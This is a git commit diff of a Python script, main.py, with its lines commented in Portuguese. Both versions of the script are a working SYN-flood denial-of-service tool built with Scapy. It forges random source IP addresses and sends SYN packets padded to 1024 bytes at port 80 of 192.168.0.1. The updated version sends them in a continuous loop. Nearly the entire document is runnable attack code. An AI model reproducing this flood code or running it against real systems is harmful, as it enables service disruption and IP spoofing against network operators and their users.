2b620c8e8224b22c84cffb4556efbfc0a24adece
Sarah Medeiros <57346466+SarahMedeir0s@users.noreply.github.com>
2023-07-13 23:30:22 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,26 +1,17 @@
-from scapy.all import *
+from scapy.all import *  # Importa todas as classes e funções do Scapy
+from scapy.layers.inet import IP, TCP  # Importa as classes IP e TCP do módulo scapy.layers.inet
 
-conf.use_pcap = True
-count = 1
+conf.use_pcap = True  # Configura o Scapy para usar o método de captura pcap que captura e analisa pacotes de rede
 
-def randomIP():
-  return f"{random.randint(100, 255)}.{random.randint(100, 255)}.{random.randint(0, 10)}.{random.randint(100, 255)}"
+random_ip = RandIP()  # Gera um endereço IP aleatório
+target_ip = "192.168.0.1"  # Define o endereço IP de destino
 
-while True:
-  
-  random_ip = randomIP()
-  target_ip = "192.168.0.1"
+ip = IP(dst=target_ip, ttl=10, src=random_ip)  # Cria o cabeçalho IP com o endereço de destino, TTL e endereço de origem
 
-  ip = IP(dst=target_ip, ttl=10, src=random_ip)
+tcp = TCP(sport=RandShort(), dport=80, flags="S")  # Cria o cabeçalho TCP com porta de origem aleatória, porta de destino 80 e flag "S" (SYN)
 
-  tcp = TCP(sport=RandShort(), dport=80, flags="S")
+raw = Raw(b"X"*1024)  # Cria a carga útil RAW com 1024 bytes preenchidos com o caractere "X"
 
-  raw = Raw(b"X"*1024)
+p = ip/tcp/raw  # Combina os cabeçalhos IP, TCP e a carga útil RAW para formar o pacote final
 
-  p = ip/tcp/raw
-
-  print(f"Requisição: {count}. De: {random_ip} Para: {target_ip}")
-
-  send(p, loop=0, verbose=0)
-
-  count += 1
+send(p, loop=1, verbose=0)  # Envia o pacote para o destino (loop=1 para enviar continuamente, verbose=0 para não exibir informações detalhadas)
